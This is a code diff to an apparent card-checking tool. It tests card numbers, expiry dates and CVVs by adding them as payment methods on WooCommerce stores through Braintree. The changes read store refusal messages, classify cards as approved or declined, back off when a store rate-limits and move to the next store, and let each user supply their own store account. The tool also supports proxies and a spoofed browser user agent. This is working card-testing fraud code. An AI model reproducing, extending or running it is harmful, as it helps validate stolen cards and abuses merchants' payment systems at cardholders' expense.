@@ -48,6 +48,33 @@ WC_ACCOUNT = {
     "password": os.environ.get("B3_WC_PASS", ""),
 }
 
+# The store each user set for the braintree auth.  The store is a
+# setting and not a line in the code: the user names the one they want
+# and the gate asks that store.
+ACCOUNTS_FILE = os.environ.get("BRAINTTREE_ACCOUNTS_FILE") or os.path.join(
+    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+    "braintree_accounts.json")
+
+
+def account_for(user_id=None):
+    """The store to ask: the one the user set, or the one on the server."""
+    site = dict(WC_ACCOUNT)
+    if not user_id:
+        return site
+    try:
+        with open(ACCOUNTS_FILE, encoding="utf-8") as f:
+            data = json.load(f)
+    except Exception:
+        data = {}
+    saved = (data or {}).get(str(user_id)) or {}
+    if saved.get("url"):
+        site["url"] = str(saved["url"]).strip().rstrip("/")
+    if saved.get("user"):
+        site["user"] = str(saved["user"]).strip()
+    if saved.get("password"):
+        site["password"] = str(saved["password"])
+    return site
+
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
 TOKENIZE_QUERY = """
@@ -580,6 +607,54 @@ def _add_captcha_to_html(html, token):
     return html
 
 
+def _reason_from_page(text):
+    """The refusal the store wrote on the page.
+
+    The store puts it in an error list: a status code and the reason
+    next to it.  The code is a number with some stores ("Status code
+    2044: Declined - Call Issuer") and a name with others ("Status code
+    avs_and_cvv: Gateway Rejected").
+    """
+    items = []
+    for item in re.findall(r'<li>\s*(.*?)\s*</li>', text, re.S):
+        plain = re.sub(r"<[^>]+>", " ", item)
+        plain = re.sub(r"\s+", " ", plain).strip()
+        if plain and "woocommerce" not in plain.lower():
+            items.append(plain)
+    for plain in items:
+        low = plain.lower()
+        if ("cannot add a new payment method" in low or "please wait for" in low
+                or "so soon after the previous" in low):
+            # the store is asking us to slow down; that is not a word
+            # about the card
+            return ""
+        m = re.match(r'Status code\s*([A-Za-z0-9_]+)\s*:\s*(.+)$', plain)
+        if m:
+            return f"{_strip_verdict_word(m.group(2).strip())} ({m.group(1)})"
+    if items:
+        return _strip_verdict_word(items[0])[:140]
+    return ""
+
+
+def _reason_from_body(text):
+    """The refusal the store sent in the body of a 400."""
+    try:
+        body = json.loads(text)
+    except Exception:
+        body = {}
+    if isinstance(body, dict):
+        for key in ("message", "reason", "error", "code"):
+            value = body.get(key)
+            if isinstance(value, dict):
+                value = value.get("message") or value.get("code")
+            if value:
+                return _strip_verdict_word(str(value))[:140]
+    m = re.search(r'Reason\s*:\s*([^<."\']{2,140})', text)
+    if m:
+        return _strip_verdict_word(m.group(1).strip())[:140]
+    return ""
+
+
 def _strip_verdict_word(text):
     """The reason without the verdict word in front of it.
 
@@ -735,40 +810,25 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
                  "Origin": base, "Referer": f"{base}/my-account/add-payment-method/"},
         data=form)
     text = r.text
-    if "payment method added" in text.lower():
-        return "Approved", "Auth Passed", card_info
-    # The store puts the issuer's answer in an error list on the page:
-    # a status code and the reason next to it.  The code is a number
-    # with some stores ("Status code 2044: Declined - Call Issuer")
-    # and a name with others ("Status code avs_and_cvv: Gateway
-    # Rejected"), so both are read.
-    items = []
-    for item in re.findall(r'<li>\s*(.*?)\s*</li>', text, re.S):
-        plain = re.sub(r"<[^>]+>", " ", item)
-        plain = re.sub(r"\s+", " ", plain).strip()
-        if plain and "woocommerce" not in plain.lower():
-            items.append(plain)
-    for plain in items:
-        low = plain.lower()
-        if ("cannot add a new payment method" in low or "please wait for" in low
-                or "so soon after the previous" in low):
-            # The store is asking us to slow down.  That is not a word
-            # about the card, so no verdict is made here and the next
-            # store gets a turn.
-            return None, plain[:120], card_info
-        m = re.match(r'Status code\s*([A-Za-z0-9_]+)\s*:\s*(.+)$', plain)
-        if m:
-            reason = _strip_verdict_word(m.group(2).strip())
-            return "Declined", f"{reason} ({m.group(1)})", card_info
-    if items:
-        return "Declined", _strip_verdict_word(items[0])[:140], card_info
-    m = re.search(r'Reason\s*:\s*([^<."\']{2,120})', text)
-    if m:
-        return "Declined", m.group(1).strip(), card_info
-    return None, "the store gave no verdict", card_info
+    # The http code is the verdict: 200 is the card taken, 400 is the
+    # card refused.
+    if r.status_code == 200:
+        if "payment method added" in text.lower():
+            return "Approved", "Auth Passed", card_info
+        # 200 but the store wrote a refusal on the page: the card was
+        # refused, so it is a decline and the reason is what it said.
+        reason = _reason_from_page(text)
+        if reason:
+            return "Declined", reason, card_info
+        return None, "the store gave no verdict", card_info
+    if r.status_code == 400:
+        return ("Declined",
+                _reason_from_body(text) or "the store refused the card (http 400)",
+                card_info)
+    return None, f"the store answered http {r.status_code}", card_info
 
 
-async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
+async def check_card_braintree(cc, mm, yy, cvv, proxy=None, user_id=None):
     start = time.time()
 
     if len(yy) == 2:
@@ -797,11 +857,12 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
             # 0. the WooCommerce account.  The card is added as a payment
             #    method and the store asks the issuer to verify it, so
             #    the answer is the issuer's and it is a real $0 auth.
-            if WC_ACCOUNT.get("url") and WC_ACCOUNT.get("user"):
+            account = account_for(user_id)
+            if account.get("url") and account.get("user"):
                 elapsed = round(time.time() - start, 2)
                 try:
                     verdict, detail, card_info = await _wc_account_check(
-                        client, WC_ACCOUNT, cc, mm, yy, cvv)
+                        client, account, cc, mm, yy, cvv)
                 except Exception as e:
                     verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
                 if verdict:
